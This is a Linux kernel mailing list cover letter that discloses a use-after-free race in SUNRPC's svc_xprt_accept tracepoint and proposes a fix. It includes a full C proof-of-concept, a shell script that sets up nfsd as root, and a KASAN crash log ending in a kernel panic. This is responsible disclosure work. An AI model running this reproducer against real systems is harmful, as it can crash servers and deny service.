Received: from mail-pf1-f182.google.com (mail-pf1-f182.google.com [209.85.210.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C5DB7326939
	for <linux-nfs@vger.kernel.org>; Sat, 12 Sep 2026 13:56:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.182
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789221385; cv=none; b=gQ9wBv97rgad4b8DuYPNI/uGrzLWuIPProj6ras2KEjgOJPUgbFLDg6r2MW/vyrdbg/RsxQquDHKUWGW4UXwulEf43TqSV9UQBt0a1zlT/+0FbC2fKi6t3NGsbIaIN0bdjiZOdwCm0x+ezzjV9NQLtNf/rycUNW1qYe67siVbpQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789221385; c=relaxed/simple;
	bh=3Zmgdw0QDt5Fg7eG1DHFlfLM0BG26coxDtoMF6t7tKY=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=uSry4CnOTmG2KZgmTMPyu53dEOIyA1gjVngMqYaqGwR6SiQ1GVVeB4rTYgJhTjCNHNXs41jGTPM0OOosnfzU9KULI9yMi1hq2U7REJb6GqaczvLQ31oOvj/gtCSIs+EyB1Ht0GT9y/pwA+13xXLy894pPZWu+tyW3ZQgn43eqZk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=HUmyHQXp; arc=none smtp.client-ip=209.85.210.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="HUmyHQXp"
Received: by mail-pf1-f182.google.com with SMTP id d2e1a72fcca58-8692be1cda4so1524966b3a.1
        for <linux-nfs@vger.kernel.org>; Sat, 12 Sep 2026 06:56:23 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789221383; x=1789826183; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=ltE8hmOwdxEerL1lVsOCisOm4JARkEhCGeOYU3e883U=;
        b=HUmyHQXp6q5Oe6Z95iqXKARhUJcainnBK9q9sJpvpNnoEjS8dYKZ/3cqlOGzufkgEj
         nUPfGrG3dGr70E8jPeitEQJ17xnHhBNeG3WEdjCxVjJsaY1Wa3gTL2FxULdQ1T5rfa88
         kUc3QGCkc6uhefoUKC82JB+XlmQAkNo1Gu4f0yE8dKrozSRGn23U2IpM8xebAoZXOvHQ
         R0gmxrfCJ1PTyXtkYfS7xNNy11E9iM/7yUauS3dxPEaVN/OByz6R5hjPRAa5k2Z5l9r9
         bEjzKC1UsmTL71oNKkIC3oU/7548d2gq0dOD/1xhiXaJ6nyE0I/eJ3nT5ba6iTcjs3Kt
         vi5A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1789221383; x=1789826183;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=ltE8hmOwdxEerL1lVsOCisOm4JARkEhCGeOYU3e883U=;
        b=Y+h4e/SYllP/9kpl6rDLHhPIySk88F7LEIEWbHnFDqR33KYvrufle51bdCKaP6rweo
         lryFVKDuR6ZnOaftEqmigKL93jEUn6GaPHuiemjkzJoIKhIykeORBx5N0ub2NgzhN992
         v3G44c2x2MOghrbgMIi2ESI4C8HYpFcu+iE59TrAFa1n3XAvvkIZX7Lr704xwkQyySr3
         gLPUSYfcROeIl8Lr5o08CC4iZpUyAyrg8n+il2H8L9c99L6QOHcHj/s8G6WfJurB68tU
         ExJ1AazXnGP0OFBuoQbIeZxYJ5OjjAMtYnoALbqekZGVg23k/EjyJYeLSVT1Cimazox8
         tp+A==
X-Gm-Message-State: AFuF++miSwmB9fVcFyPl4MkUwj9fy7VunXmbTLqCBZ4DSgGpG7CmfcTa
	dD+wikdTW9K6TF7Z9hdP2pbDwKnoKDGPon5E5fgmVSmPOEKWM6AYIvV1JZiK5tWO9lxpOsmTIn0
	KsI0Irc5EDxo=
X-Gm-Gg: AYBFou3sRbEsLPvz1EcHcHy/CFhqrKlZhRQ48CV6MO7kficMNuIzGDaZQsZDDjNLOUN
	DFa6LQmkk5gzcZ86n6lD4xknPbVTMYd5kAOL846NfqNBJOuV8LLaQqDN6kdTpu8xhicrNp+fZ28
	eEIZTS280k8S0Tw8FMy9SspFejgIQzY5vaS7A/J5u0n8tSHsmRnhwgkM8w8wVCayPgkw9Co37Jd
	28LVUv/x+j+o+YT3tgjO5FWlpLTebBLdQI01kEVnWjU0Px5r3Zgh/lbuf9qXvytpYlCD3wRo1ku
	7MTTUkoHVh6Udu7wFxlzFF5VAKx8umCb87FnE1XMosY+442TfZRODltcuk0mnyxXwLh0uH2odwA
	TkWrAamYaqUcjx+SUzLRlBenPAtLZj3yU9m2RFoqbtLgySabKYxJS6WWc5wLXKVWF6c+6/KJ9Rr
	SyY4Nu10hIsOcCxs3Ybzc9/qpdiGOrbYiWkMsFPBH0k5zKyH0YK+ryHk3PFlyPOheog29zYJ434
	xFkXg8=
X-Received: by 2002:a05:6a21:8cc4:b0:3cc:92d9:80cb with SMTP id adf61e73a8af0-3daed4edf77mr17451958637.12.1789221383106;
        Sat, 12 Sep 2026 06:56:23 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-33ba4f1e434sm13947833eec.22.2026.09.12.06.56.18
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 12 Sep 2026 06:56:22 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-nfs@vger.kernel.org,
	netdev@vger.kernel.org
Cc: trondmy@kernel.org,
	anna@kernel.org,
	cel@kernel.org,
	jlayton@kernel.org,
	neil@brown.name,
	okorniev@redhat.com,
	Dai.Ngo@oracle.com,
	tom@talpey.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] SUNRPC: hold a reference while tracing accepted transports
Date: Sat, 12 Sep 2026 21:56:08 +0800
Message-ID: <cover.1789220778.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: linux-nfs@vger.kernel.org
List-Id: <linux-nfs.vger.kernel.org>
List-Subscribe: <mailto:linux-nfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-nfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/sunrpc/svc_xprt.c. The bug is
reachable by a root user through the NFSD listener and TCP connect path.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

svc_handle_xprt() publishes a newly accepted transport with
svc_add_new_temp_xprt() before calling trace_svc_xprt_accept(). Publishing
the transport clears XPT_BUSY and allows another service worker to close
and free it immediately.

The tracepoint then dereferences the accepted transport without holding a
reference. A concurrent connect-and-close sequence can therefore make the
tracepoint read freed transport fields, including the addresses, flags,
class, and network namespace.

The fix takes an extra reference before publishing the transport and
releases it after trace_svc_xprt_accept() returns.

Reproducer:

    make
    sh ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

    #define _GNU_SOURCE
    #include <arpa/inet.h>
    #include <errno.h>
    #include <netinet/in.h>
    #include <pthread.h>
    #include <signal.h>
    #include <stdatomic.h>
    #include <stdbool.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/socket.h>
    #include <sys/time.h>
    #include <sys/types.h>
    #include <time.h>
    #include <unistd.h>

    static atomic_bool stop_flag = false;
    static atomic_ulong attempts = 0;
    static atomic_ulong connects = 0;
    static atomic_ulong errs = 0;

    struct worker_args {
    	struct sockaddr_in addr;
    };

    static void on_signal(int sig)
    {
    	(void)sig;
    	atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
    }

    static void *worker(void *arg)
    {
    	struct worker_args *w = arg;
    	struct linger ling = {
    		.l_onoff = 1,
    		.l_linger = 0,
    	};

    	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
    		int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    		if (fd < 0) {
    			atomic_fetch_add_explicit(&errs, 1, memory_order_relaxed);
    			continue;
    		}

    		setsockopt(fd, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
    		atomic_fetch_add_explicit(&attempts, 1, memory_order_relaxed);
    		if (connect(fd, (struct sockaddr *)&w->addr, sizeof(w->addr)) == 0)
    			atomic_fetch_add_explicit(&connects, 1, memory_order_relaxed);
    		else if (errno != ECONNREFUSED && errno != ECONNRESET &&
    			 errno != ETIMEDOUT && errno != EHOSTUNREACH &&
    			 errno != ENETUNREACH)
    			atomic_fetch_add_explicit(&errs, 1, memory_order_relaxed);

    		close(fd);
    	}

    	return NULL;
    }

    int main(int argc, char **argv)
    {
    	struct worker_args args = {
    		.addr = {
    			.sin_family = AF_INET,
    			.sin_port = htons(2049),
    		},
    	};
    	pthread_t *threads;
    	unsigned int nthreads = 64;
    	unsigned int seconds = 0;
    	time_t start = time(NULL);

    	if (argc > 1)
    		nthreads = strtoul(argv[1], NULL, 0);
    	if (argc > 2)
    		seconds = strtoul(argv[2], NULL, 0);
    	if (argc > 3 && inet_pton(AF_INET, argv[3], &args.addr.sin_addr) != 1) {
    		fprintf(stderr, "bad IPv4 address: %s\n", argv[3]);
    		return 1;
    	}
    	if (argc <= 3)
    		inet_pton(AF_INET, "127.0.0.1", &args.addr.sin_addr);

    	signal(SIGINT, on_signal);
    	signal(SIGTERM, on_signal);

    	threads = calloc(nthreads, sizeof(*threads));
    	if (!threads) {
    		perror("calloc");
    		return 1;
    	}

    	for (unsigned int i = 0; i < nthreads; i++) {
    		if (pthread_create(&threads[i], NULL, worker, &args) != 0) {
    			perror("pthread_create");
    			atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
    			nthreads = i;
    			break;
    		}
    	}

    	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
    		sleep(1);
    		fprintf(stderr,
    			"elapsed=%lds attempts=%lu connects=%lu errs=%lu\n",
    			(long)(time(NULL) - start),
    			atomic_load_explicit(&attempts, memory_order_relaxed),
    			atomic_load_explicit(&connects, memory_order_relaxed),
    			atomic_load_explicit(&errs, memory_order_relaxed));
    		if (seconds && (unsigned int)(time(NULL) - start) >= seconds)
    			atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
    	}

    	for (unsigned int i = 0; i < nthreads; i++)
    		pthread_join(threads[i], NULL);
    	free(threads);
    	return 0;
    }

------END poc.c--------

------BEGIN poc.sh------

    #!/bin/sh
    set -eu

    cd "$(dirname "$0")"

    mountpoint -q /proc/fs/nfsd || mount -t nfsd nfsd /proc/fs/nfsd
    printf -- "-3 +4 +4.1 +4.2\n" > /proc/fs/nfsd/versions
    printf "tcp 2049\n" > /proc/fs/nfsd/portlist
    printf "8\n" > /proc/fs/nfsd/threads
    printf "0" > /proc/sys/kernel/panic_on_warn
    printf "1" > /sys/kernel/tracing/events/sunrpc/svc_xprt_accept/enable

    exec ./poc 128 180

------END poc.sh--------

----BEGIN crash log----

[  333.976492][ T1246] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000000: 0000 [#1] SMP KASAN NOPTI
[  333.977355][ T1246] KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]
[  333.977921][ T1246] CPU: 0 UID: 0 PID: 1246 Comm: nfsd Tainted: G    B              6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  333.978690][ T1246] Tainted: [B]=BAD_PAGE
[  333.978970][ T1246] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  333.979739][ T1246] RIP: 0010:trace_event_get_offsets_svc_xprt_accept+0x101/0x2e0
[  333.980242][ T1246] Code: 00 00 00 00 fc ff df 48 c1 ea 03 80 3c 02 00 0f 85 c3 01 00 00 48 b8 00 00 00 00 00 fc ff df 4c 8b 75 00 4c 89 f2 48 c1 ea 03 <80> 3c 02 00 0f 85 b1 01 00 00 49 8b 3e 48 c7 c0 40 ff 11 87 45 8d
[  333.981476][ T1246] RSP: 0018:ffffc90003487c98 EFLAGS: 00010256
[  333.981879][ T1246] RAX: dffffc0000000000 RBX: ffffc90003487d70 RCX: 0000000000000000
[  333.982391][ T1246] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffffc90003487c60
[  333.982899][ T1246] RBP: ffff88810948c000 R08: 0000000000000001 R09: fffffbfff162a4dc
[  333.983401][ T1246] R10: ffffffff8b1526e7 R11: ffffffff8868e950 R12: 0000000000000020
[  333.983948][ T1246] R13: ffffffff8696cb80 R14: 0000000000000000 R15: 0000000000100034
[  333.984458][ T1246] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
[  333.985059][ T1246] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  333.985486][ T1246] CR2: 00007c23a67c3f78 CR3: 0000000109790003 CR4: 0000000000770ef0
[  333.986017][ T1246] PKRU: 55555554
[  333.986254][ T1246] Call Trace:
[  333.986469][ T1246]  <TASK>
[  333.986668][ T1246]  do_trace_event_raw_event_svc_xprt_accept+0xce/0x5d0
[  333.987112][ T1246]  ? __pfx_do_trace_event_raw_event_svc_xprt_accept+0x10/0x10
[  333.987582][ T1246]  ? srso_alias_return_thunk+0x5/0xfbef5
[  333.987949][ T1246]  ? srso_alias_return_thunk+0x5/0xfbef5
[  333.988320][ T1246]  ? srso_alias_return_thunk+0x5/0xfbef5
[  333.988686][ T1246]  ? kasan_quarantine_put+0xcc/0x1d0
[  333.989350][ T1246]  svc_recv+0x1d74/0x2520
[  333.989649][ T1246]  nfsd+0x2f1/0x440
[  333.989900][ T1246]  ? __pfx_nfsd+0x10/0x10
[  333.990185][ T1246]  kthread+0x2bd/0x3a0
[  333.990451][ T1246]  ? __pfx_kthread+0x10/0x10
[  333.990750][ T1246]  ? __pfx_kthread+0x10/0x10
[  333.991046][ T1246]  ret_from_fork+0x31/0x70
[  333.991329][ T1246]  ? __pfx_kthread+0x10/0x10
[  333.991632][ T1246]  ret_from_fork_asm+0x1a/0x30
[  333.991958][ T1246]  </TASK>
[  333.992156][ T1246] Modules linked in:
[  333.992461][ T1246] ---[ end trace 0000000000000000 ]---
[  333.992828][ T1246] RIP: 0010:trace_event_get_offsets_svc_xprt_accept+0x101/0x2e0
[  333.993321][ T1246] Code: 00 00 00 00 fc ff df 48 c1 ea 03 80 3c 02 00 0f 85 c3 01 00 00 48 b8 00 00 00 00 00 fc ff df 4c 8b 75 00 4c 89 f2 48 c1 ea 03 <80> 3c 02 00 0f 85 b1 01 00 00 49 8b 3e 48 c7 c0 40 ff 11 87 45 8d
[  333.994585][ T1246] RSP: 0018:ffffc90003487c98 EFLAGS: 00010256
[  333.994975][ T1246] RAX: dffffc0000000000 RBX: ffffc90003487d70 RCX: 0000000000000000
[  333.995510][ T1246] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffffc90003487c60
[  333.996041][ T1246] RBP: ffff88810948c000 R08: 0000000000000001 R09: fffffbfff162a4dc
[  333.996546][ T1246] R10: ffffffff8b1526e7 R11: ffffffff8868e950 R12: 0000000000000020
[  333.997104][ T1246] R13: ffffffff8696cb80 R14: 0000000000000000 R15: 0000000000100034
[  333.997621][ T1246] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
[  333.998216][ T1246] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  333.998627][ T1246] CR2: 00007c23a67c3f78 CR3: 0000000109790003 CR4: 0000000000770ef0
[  333.999145][ T1246] PKRU: 55555554
[  333.999377][ T1246] Kernel panic - not syncing: Fatal exception
[  333.999901][ T1246] Kernel Offset: disabled
[  334.000176][ T1246] Rebooting in 10 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  SUNRPC: hold a reference while tracing accepted transports

 net/sunrpc/svc_xprt.c | 2 ++
 1 file changed, 2 insertions(+)

-- 
2.43.0

